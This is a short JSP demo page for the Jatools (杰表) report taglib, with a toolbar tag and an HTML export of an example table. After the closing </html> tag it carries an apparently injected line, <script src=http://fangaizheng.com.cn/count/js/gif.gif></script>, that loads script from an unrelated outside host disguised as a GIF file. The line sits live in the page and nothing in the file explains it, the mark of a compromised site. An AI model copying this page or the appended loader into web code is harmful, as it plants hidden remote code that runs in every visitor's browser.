<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>
<body>
<div style="float:right">本页面采用杰表提供的taglib来组装页面,
<a href="#" onClick="window.open('jatoolstag.jsp.htm','','resizable,height=380,width=730');return false;" class="text_navi">点击此处查看jsp源码</a>
</div>
<br>
<jatools:pagetool style="font-family:楷体"/>
<br>
<jatools:exporthtml source="example/table.xml" bordershadow="0" />
</body>
</html><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
